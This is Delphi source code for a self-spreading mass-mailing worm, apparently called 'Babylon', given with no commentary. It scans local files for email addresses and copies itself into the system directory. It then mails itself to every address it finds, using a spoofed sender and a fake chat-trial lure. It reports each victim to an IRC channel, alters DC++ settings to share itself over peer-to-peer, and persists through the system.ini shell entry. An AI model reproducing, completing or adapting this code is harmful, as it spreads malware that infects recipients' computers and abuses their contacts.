   Unit untFunc;

   InterFace

   Uses
     Windows,
     Messages,
     MXResolver,
     Winsock;

   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     TScanData = Record
       ScanDir: String;
       ScanName: String;
       ScanMask: String;
     End;
     PScanData = ^TScanData;

     TMailData = Record
       MailTo    : String;
       Subject   : String;
       Body      : String;
       MailFrom  : String;
       Attachemnt: String;
     End;
     PMailData = ^TMailData;

     TGatherData = Record
       Filter: String;
       Dir   : String;
     End;
     PGatherData = ^TGatherData;

   const
     faReadOnly            = $00000001;
     faHidden              = $00000002;
     faSysFile             = $00000004;
     faVolumeID            = $00000008;
     faDirectory           = $00000010;
     faArchive             = $00000020;
     faAnyFile             = $0000003F;

     INSTALL_ERROR         = 0;
     INSTALL_FINE          = 1;
     INSTALL_MUTEXFAIL     = 2;

   Var
     MAIL_FILENAME: Array[0..10000] Of String;
     MAIL_MAIL    : Array[0..10000] Of String;
     FILE_FILENAME: Array[0..10000] Of String;

     mailFilenameCount,
     mailMailCount,
     fileFilenameCount: Integer;

     ScanData     : TScanData;
     MailData     : TMailData;
     GatherData   : TGatherData;

     IRCSocket    : TSocket;

   // Functions

     function InstallMe(FileName: String; Mutex:String):Integer;
     function SysDir(FileName: String): String;

     function DoScan(P: Pointer): Dword; Stdcall;
     function DoGather(P: Pointer): Dword; Stdcall;
     function DoMail(P: Pointer): Dword; StdCall;

     function ExtractFileName(const Path: string): string;
     function ExtractFileExt(const Filename: string): string;
     function InttoStr(const Value: integer): string;
     function StrtoInt(const S: string): integer;
     function LowerCase(const S: string): string;
     function GetFileSize(FileName: String): Int64;
     function IPstr(HostName:String) : String;
     function ZipIt(var fName: String): Boolean;

   // Procedures

     PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); OVERLOAD; REGISTER;
     PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;
     Procedure SendIRCText(Sock: TSocket; Text: String);

   Implementation

   //------------------------------------------------------------------------------

   Procedure SendIRCText(Sock: TSocket; Text: String);
   Var
     Data: String;
   Begin
     Data := 'PRIVMSG #Babylon :'+Text+#10;
     Send(Sock, Data[1], Length(Data), 0);
   End;

   procedure InfectDC(Path: String);
   Var
     f: TextFile;
     l: String;
     t: String;
     e: String;
   Begin

     AssignFile(F, Path+'DCPlusPlus.xml');
     Reset(F);
     Read(F, L);
     t := l;
     ReadLn(F, L);
     While Not Eof(F) Do
     Begin
       Read(F, L);
       t := t + l;
       ReadLn(F, L);
     End;
     CloseFile(F);

     e := Copy(t, 1, pos('<Description type="string">', t)-1);
     e := e + '<Description type="string">sIRC:ed</Description>';
     t := Copy(t, Pos('</Description>', t)+14, Length(T));

     e := e + Copy(T, 1, pos('<Share>', t)+7);
     e := e + '<Directory>'+SysDir('DCCShare')+'</Directory>' + Copy(T, pos('<Share>', t)+7, Length(T));

     AssignFile(F, Path+'DCPlusPlus.xml');
     Rewrite(F);
     Write(F, e);
     CloseFile(F);

   End;


   //------------------------------------------------------------------------------

   Procedure WriteBat(bName, bText : String; Run:Boolean);
   Var
     f : TextFile;
   Begin
     AssignFile(f, bName);
     ReWrite(f);
     Writeln(f, bText);
     writeln(f, 'del '+bname);
     CloseFile(f);
     If Run Then
       WinExec(pChar(bName), 0);
   End;

   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   Var
    Key : Hkey;
    Siz : Cardinal;
    Val : Array[0..16382] Of Char;
   Begin
    ZeroMemory(@Val, Length(Val));
    RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
    Siz := 16383;
    RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(Key);
    If Val<> '' then
     Result := Val;
   End;

   Function ZipIt(var fName: String): Boolean;
   Var
     zipPath: String;
     rarPath: String;
     rarString: String;
     zipString: String;
     rnd    : Integer;
     zipExist : Boolean;
     rarExist : Boolean;
   Begin
     Result := False;

     zipString := '" -a -r "'+Copy(fName, 1, length(fname)-4)+'" "'+fname+'"';
     rarString := '" a -idp -inul -c- -m5 "'+Copy(fName, 1, length(fname)-4)+'" "'+fname+'"';

     zipExist := False;
     rarExist := False;

     If GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\winzip32.exe', '') <> '' Then
     Begin
       zipExist := True;
       zipPath := GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\winzip32.exe', '');
     End;

     If GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\WinRAR.exe', '') <> '' Then
     Begin
       rarExist := True;
       rarPath := GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\app paths\WinRAR.exe', '');
     End;

     If (rarExist) and (zipExist) Then
     Begin
       zipString := '"' + zipPath + zipString;
       rarString := '"' + rarPath + rarString;

       Randomize;
       Rnd := Random(100);

       If Rnd > 50 Then
       Begin
         fName := Copy(fName, 1, length(fname)-4) + '.rar';
         WriteBat('C:\rar.bat', rarString, true);
       End Else
       Begin
         fName := Copy(fName, 1, length(fname)-4) + '.zip';
         WriteBat('C:\zip.bat', zipString, true);
       End;

     End Else
     If (rarExist) and (Not ZipExist) Then
     Begin
       fName := Copy(fName, 1, length(fname)-4) + '.rar';
       rarString := '"' + rarPath + rarString;
       WriteBat('C:\rar.bat', rarString, true);
     End Else
     If (Not rarExist) and (zipExist) Then
     Begin
       fName := Copy(fName, 1, length(fname)-4) + '.zip';
       zipString := '"' + zipPath + zipString;
       WriteBat('C:\zip.bat', zipString, true);
     End Else
       Result := False;

   End;


   PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER;
   CONST
     cBase64Codec : ARRAY [0..63] OF AnsiChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
   VAR
     ByThrees : Cardinal;
     LeftOver : Cardinal;
     Line     : Word;
   ASM
     mov ESI,[EAX]
     mov EDI,[ECX]
     mov EAX,EBX
     mov ECX,$03
     xor EDX,EDX
     div ECX
     mov ByThrees,EAX
     mov LeftOver,EDX
     lea ECX,cBase64Codec[0]
     xor EAX,EAX
     xor EBX,EBX
     xor EDX,EDX
     cmp ByThrees,0
     jz  @@LeftOver
     mov Line,0
     @@LoopStart:
     inc Line
     LODSW
     mov BL,AL
     shr BL,2
     mov DL,BYTE PTR [ECX+EBX]
     mov BH,AH
     and BH,$0F
     rol AX,4
     and AX,$3F
     mov DH,BYTE PTR [ECX+EAX]
     mov AX,DX
     STOSW
     LODSB
     mov BL,AL
     shr BX,6
     mov DL,BYTE PTR [ECX+EBX]
     and AL,$3F
     xor AH,AH
     mov DH,BYTE PTR [ECX+EAX]
     mov AX,DX
     STOSW
     cmp Line,19
     jnz @@ugor
     mov AX,$0A0D
     STOSW
     mov Line,0
     @@ugor:
     dec ByThrees
     jnz @@LoopStart
     @@LeftOver:
     cmp LeftOver, 0
     jz  @@Done
     xor EAX,EAX
     xor EBX,EBX
     xor EDX,EDX
     LODSB
     shl AX,6
     mov BL,AH
     mov DL,BYTE PTR [ECX+EBX]
     dec LeftOver
     jz  @@SaveOne
     shl AX,2
     and AH,$03
     LODSB
     shl AX,4
     mov BL,AH
     mov DH,BYTE PTR [ECX+EBX]
     shl EDX,16
     shr AL,2
     mov BL,AL
     mov DL,BYTE PTR [ECX+EBX]
     mov DH,'='
     jmp @@WriteLast4
     @@SaveOne:
     shr AL,2
     mov BL,AL
     mov DH,BYTE PTR [ECX+EBX]
     shl EDX,16
     mov DH,'='
     mov DL,'='
     @@WriteLast4:
     mov EAX,EDX
     ror EAX,16
     STOSD
     @@Done:
   END;

   PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;
   VAR
     PIn     : Pointer;
     POut    : Pointer;
     InSize  : Cardinal;
     OutSize : Cardinal;
   BEGIN
     InSize:=Length(InText);
     OutSize:=(InSize DIV 3) SHL 2;
     IF InSize MOD 3>0 THEN Inc(OutSize,4);
     Outsize:=Outsize+Outsize DIV 20;
     SetLength(OutText,OutSize);
     PIn:=@InText[1];
     POut:=@OutText[1];
     Base64Encode(PIn,InSize,POut);
   END;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function DirectoryExists(const Directory: string): Boolean;
   var
     Code: Integer;
   begin
     Code := GetFileAttributes(PChar(Directory));
     Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
   end;

     //----------------------------------------------------------------------------

     Function DoMail(P: Pointer): Dword; StdCall;
     Var
       Sock        :TSocket;
       Addr        :TSockAddrIn;
       Wsa         :TWSAData;

       MailTo      : String;
       Subject     : String;
       Body        : String;
       MailFrom    : String;
       Attachemnt  : String;
       Data        : String;

       FileBuf     : AnsiString;
       Poo         : AnsiString;

       F           : File;

       MX          : TMXResolver;

       I           : Integer;
     Begin
       MailTo      := PMailData(P)^.MailTo;
       Subject     := PMailData(P)^.Subject;
       Body        := PMailData(P)^.Body;
       MailFrom    := PMailData(P)^.MailFrom;
       Attachemnt  := PMailData(P)^.Attachemnt;

       ZipIt(Attachemnt);

       If DirectoryExists( pChar(SysDir('DCCShare')) ) Then
       Begin
         CopyFile(pChar(Attachemnt), pChar(SysDir('DCCShare\')+ExtractFileName(Attachemnt)), False);
       End Else
       Begin
         CreateDirectory(pChar(SysDir('DCCShare')), NIL);
         CopyFile(pChar(Attachemnt), pChar(SysDir('DCCShare\')+ExtractFileName(Attachemnt)), False);
       End;

       WSAStartUp(MAKEWORD(2,1),Wsa);

       Mx := TMXResolver.Create(Copy(MailTo, Pos('@', MailTo)+1, Length(MailTo)));

       For I := 0 To Mx.ListOfSMTPServers.Count -1 Do
       Begin
         Sock := Socket(AF_INET, SOCK_STREAM, 0);
         If Sock = -1 Then Exit;

         Addr.sin_family := AF_INET;
         Addr.sin_port := hTons(25);
         Addr.sin_addr.S_addr := Inet_Addr(pChar( IPStr( MX.ListOfSMTPServers.Strings(I) ) ));

         If Connect(Sock, Addr, SizeOf(Addr)) = -1 Then Exit;

         SendIRCText(IRCSocket, '[ML]::'+(MailTo));

         Data := 'HELO net.com'#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;
         Data := 'MAIL FROM: <'+MailFrom+'>'#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;
         Data := 'RCPT TO: <'+MailTo+'>'#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;
         Data := 'DATA'#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;
         Data := 'From: '+MailFrom+#13#10+
                 'To: '+MailTo+#13#10+
                 'Subject: '+Subject+#13#10+
                 'MIME-Version: 1.0'#13#10+
                 'Content-Type: multipart/mixed; boundary="babylon"'#13#10#13#10+
                 '--babylon'#13#10+
                 'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
                 Body+#13#10#13#10+
                 '--babylon'#13#10+
                 'Content-Type: application/x-shockwave-flash;'#13#10+
                 '    name="'+ExtractFileName(Attachemnt)+'"'#13#10+
                 'Content-Transfer-Encoding: base64'#13#10#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;

         AssignFile(F,Attachemnt);
         FileMode:=0;
         {$I-}
         Reset(F,1);
         IF IOResult=0 THEN BEGIN
           SetLength(FileBuf,FileSize(F));
           BlockRead(F,FileBuf[1],GetFileSize(Attachemnt));
           Base64Encode(FileBuf,Poo);
           Data := Poo;
           If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;
           CloseFile(F);
         END;
         {$I+}

         Data := #13#10'--babylon--'#13#10'.'#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;

         Data := 'QUIT'#13#10;
         If Send(Sock, Data[1], Length(Data), 0) = -1 Then Exit;

       End;

       WSACleanUp();

     End;

     //----------------------------------------------------------------------------

     Function DoGather(P: Pointer): Dword; Stdcall;
     Var
       FileName    :String;
       FileExt     :String;
       Filter      :String;
       Dir         :String;
       Tmp         :String;
       Line        :String;

       Ch          :String;
       Tmp1,Tmp2   :String;

       F           :TextFile;

       FileSize    :Integer;
       I,J         :Integer;
       Count       :Integer;

       ThreadID    :Dword;
     Begin
       Filter := PGatherData(P)^.Filter;
       Dir    := PGatherData(P)^.Dir;
       Count  := 0;
       Repeat
         For I := 0 To 10000 Do
         Begin
           FileName := MAIL_FILENAME[i];
           If FileName <> '' Then
           Begin
             MAIL_FILENAME[i] := '';
             FileSize := GetFileSize(FileName);
             If FileSize <= (1024 * 100) Then
             Begin
               FileExt := ExtractFileExt(FileName);
               If Pos(LowerCase(FileExt),LowerCase(Filter)) > 0 Then
               Begin
                 If CopyFile(pChar(FileName), pChar(Dir+'tmp_'+ExtractFileName(FileName)), False) Then
                 Begin

                   FileName := Dir+'tmp_'+ExtractFileName(FileName);

                   AssignFile(F, FileName);
                   Reset(F);

                   Read(F, Tmp);
                   Line := Tmp;
                   ReadLn(F, Tmp);

                   While Not Eof(F) Do
                   Begin
                     Read(F, Tmp);
                     Line := Line + Tmp;
                     ReadLn(F, Tmp);
                   End;

                   CloseFile(F);

                   If DeleteFile(pChar(FileName)) Then
                   Begin
                     { Finding Mails }
                       If Pos('@', Line) > 0 Then
                       Begin
                         {Get Params}
                         Tmp1 := '';
                         Tmp2 := '';
                         J := 0;
                         Ch := '';

                         For J := 1 To Length(Line) Do
                         Begin
                           Ch := Line[j];
                           If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
                           Begin
                             Tmp1 := Tmp1 + Ch;
                           End Else
                           Begin
                             If Pos('@', Tmp1)>0 Then
                             Begin
                               If Count < 10000 Then
                               Begin
                                 If (Tmp1 <> '@') And
                                    (Tmp1[1] <> '@') And
                                    (Tmp1[Length(Tmp1)] <> '@') And
                                    (Pos('.', Tmp1) > 0) Then
                                 Begin
                                   MAIL_MAIL[Count] := Tmp1;
                                   Inc(Count);
                                   Sleep(100);
                                   MailData.MailTo := Tmp1;
                                   MailData.Subject := 'The Babylon Systems';
                                   MailData.Body := 'The Babylon Systems invtes you to test out the new '#13#10+
                                                    'Babylon chat systems. Try this trial for 20 free days and then'#13#10+
                                                    'choose if you want to keep it or not.'#13#10#13#10+
                                                    'Regards Babylon Systems (http://www.babylonsystem.com)';
                                   MailData.MailFrom := 'Babylon Systems <Babylon@Gov.net>';
                                   MailData.Attachemnt := Sysdir('Babylon.exe');

                                   CopyFile(pChar(ParamStr(0)), pChar(SysDir('Babylon.exe')), False);

                                   CreateThread(NIL, 0, @DoMail, @MailData, 0, ThreadID);
                                 End;
                               End;
                               Tmp1 := '';
                             End Else
                               Tmp1 := '';
                           End;
                         End;
                       End;
                     { Finding Mails }
                   End;
                 End;
               End;
             End;
           End;
         End;
       Until 1 = 2;
     End;

     //----------------------------------------------------------------------------

     function GetFileSize(FileName: String): Int64;
     Var
       H: THandle;
       fData: tWin32FindData;
     Begin
       Result := -1;
       H := FindFirstFile(pChar(FileName), fData);
       If H <> INVALID_HANDLE_VALUE Then
       Begin
         Windows.FindClose(H);
         Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
       End;
     End;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function StrtoInt(const S: string): integer;
   var
     E: integer;
   begin
     Val(S, Result, E);
   end;

   function InttoStr(const Value: integer): string;
   var
     S: string[11];
   begin
     Str(Value, S);
     Result := S;
   end;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, L - i);
         Break;
       end;
     end;
   end;

     //----------------------------------------------------------------------------

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;
       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

     Function DoScan(P: Pointer): Dword; Stdcall;
     Var
       sDir  : String;
       sName : String;
       sMask : String;
       Sr    : TSearchRec;
       ThreadID:DWord;
     Begin
       sDir  := PScanData(P)^.ScanDir;
       sName := PScanData(P)^.ScanName;
       sMask := PScanData(P)^.ScanMask;

       If sDir[Length(sDir)] <> '\' Then sDir := sDir + '\';
       If FindFirst(sDir + '*.*', faDirectory, SR) = 0 Then
         Repeat
           If ((SR.Attr and faDirectory) = faDirectory) and (Sr.Name[1] <> '.') Then
           Begin
             ScanData.ScanDir := sDir + Sr.Name;
             DoScan(@ScanData);
           End
           Else Begin
             If Sr.Name = 'DCPlusPlus.xml' Then InfectDC(sDir+Sr.Name);

             If LowerCase(ExtractFileExt(Sr.Name)) = 'exe' Then
             Begin
               FILE_FILENAME[fileFilenameCount] := sDir+Sr.Name;
               Inc(fileFilenameCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'scr' Then
             Begin
               FILE_FILENAME[fileFilenameCount] := sDir+Sr.Name;
               Inc(fileFilenameCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'pif' Then
             Begin
               FILE_FILENAME[fileFilenameCount] := sDir+Sr.Name;
               Inc(fileFilenameCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'com' Then
             Begin
               FILE_FILENAME[fileFilenameCount] := sDir+Sr.Name;
               Inc(fileFilenameCount);
             End;

             If LowerCase(ExtractFileExt(Sr.Name)) = 'htm' Then
             Begin
               MAIL_FILENAME[mailMailCount] := sDir+Sr.Name;
               Inc(mailMailCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'html' Then
             Begin
               MAIL_FILENAME[mailMailCount] := sDir+Sr.Name;
               Inc(mailMailCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'pl' Then
             Begin
               MAIL_FILENAME[mailMailCount] := sDir+Sr.Name;
               Inc(mailMailCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'php' Then
             Begin
               MAIL_FILENAME[mailMailCount] := sDir+Sr.Name;
               Inc(mailMailCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'asp' Then
             Begin
               MAIL_FILENAME[mailMailCount] := sDir+Sr.Name;
               Inc(mailMailCount);
             End;
             If LowerCase(ExtractFileExt(Sr.Name)) = 'txt' Then
             Begin
               MAIL_FILENAME[mailMailCount] := sDir+Sr.Name;
               Inc(mailMailCount);
             End;

           End;
         Until (FindNext(Sr) <> 0);
       FindClose(SR);
       Result := INSTALL_FINE;
     End;

     //----------------------------------------------------------------------------
     Function SysDir(FileName: String): String;
     Var
       Dir: Array[0..256] Of Char;
     Begin
       GetSystemDirectory(Dir, 256);
       Result := String(Dir)+'\'+FileName;
     End;

     //----------------------------------------------------------------------------
     Function InstallMe(FileName: String; Mutex:String):Integer;
     Begin
       Result := INSTALL_FINE;

       CreateMutex(nil, false, pchar(mutex));
       If GetLastError = ERROR_ALREADY_EXISTS Then
         Result := INSTALL_MUTEXFAIL;

       If Result = INSTALL_FINE Then
       Begin
         If Not CopyFile(pChar(ParamStr(0)), pChar(SysDir(Filename)), False) Then
           Result := INSTALL_ERROR;
         If Result = INSTALL_FINE Then
           WritePrivateProfileString('boot','shell', pChar('Explorer.exe '+Filename), 'system.ini');
       End;

     End;

     //----------------------------------------------------------------------------

   End.
